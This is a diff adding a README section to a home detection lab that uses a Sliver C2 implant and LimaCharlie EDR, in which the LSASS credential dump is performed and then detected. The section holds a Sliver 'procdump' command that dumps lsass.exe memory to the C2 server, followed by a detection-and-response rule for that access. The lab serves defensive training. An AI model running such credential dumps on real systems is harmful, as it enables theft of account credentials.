@@ -132,3 +132,69 @@ This project focuses on deploying a comprehensive threat detection lab in Azure 
 4. **Observe EDR Telemetry:**
    - In the LimaCharlie web UI, navigate to "Sensors" and select the active Windows sensor.
    - Check the "Timeline" for real-time EDR telemetry and event logs. If you scroll back far enough, you should be able to find the moment your implant was created on the system, when it was launched shortly after, and the network connections it created immediately after.
+
+## Detecting and Preventing LSASS Credential Dumping Attack
+
+### Perform LSASS Credential Dumping on the Victim Host
+
+1. **Check Privileges:**
+   - Within the Sliver session on your victim Windows VM, run the following command to check your privileges:
+     ```bash
+     getprivs
+     ```
+   - Look for the `SeDebugPrivilege`, which is essential for performing privileged actions. If you have it, you're good to go.
+
+2. **Dump LSASS Process:**
+   - Execute the following command to dump the `lsass.exe` process from memory:
+     ```bash
+     procdump -n lsass.exe -s lsass.dmp
+     ```
+   - This command will dump the `lsass.exe` process and save it locally on your Sliver C2 server.
+
+### Monitor for LSASS Access Events in LimaCharlie
+
+3. **Filter Events:**
+   - In the LimaCharlie UI, navigate to the "Timeline" of your Windows VM sensor.
+   - Use the "Event Type Filters" to filter for `SENSITIVE_PROCESS_ACCESS` events.
+   - Review the filtered events to find one where the `lsass.exe` process was accessed. This event indicates the credential access attempt.
+
+### Create a Detection & Response Rule in LimaCharlie
+
+4. **Create Detection Rule:**
+   - In the "Detect" section of the new rule, add the following content:
+     ```yaml
+     event: SENSITIVE_PROCESS_ACCESS
+     op: ends with
+     path: event/*/TARGET/FILE_PATH
+     value: lsass.exe
+     ```
+   - This detection rule will trigger when `SENSITIVE_PROCESS_ACCESS` events target the `lsass.exe` process.
+
+5. **Create Response Rule:**
+   - In the "Respond" section of the rule, add the following:
+     ```yaml
+     - action: report
+       name: LSASS access
+     ```
+   - This response rule instructs LimaCharlie to generate a detection report whenever this event is detected.
+
+6. **Save and Enable the Rule:**
+   - Scroll up, click "Save Rule," and name it "LSASS Accessed."
+   - Ensure that the rule is enabled.
+
+### Test the Detection Rule
+
+7. **Rerun the LSASS Dump Command:**
+   - Go back to your Sliver server console, and within the C2 session, rerun the `procdump` command:
+     ```bash
+     procdump -n lsass.exe -s lsass.dmp
+     ```
+
+8. **Verify Detection in LimaCharlie:**
+   - After rerunning the command, go to the "Detections" tab on the LimaCharlie main left-side menu.
+   - If you are still in the context of your sensor, click "Back to Sensors" at the top of the menu to access the "Detections" option.
+   - Verify that LimaCharlie detected the `lsass.exe` event on your VM, confirming that your Detection & Response rule is functioning correctly.
+
+---
+
+This section outlines the steps to detect and prevent LSASS credential dumping attacks using Sliver and LimaCharlie.
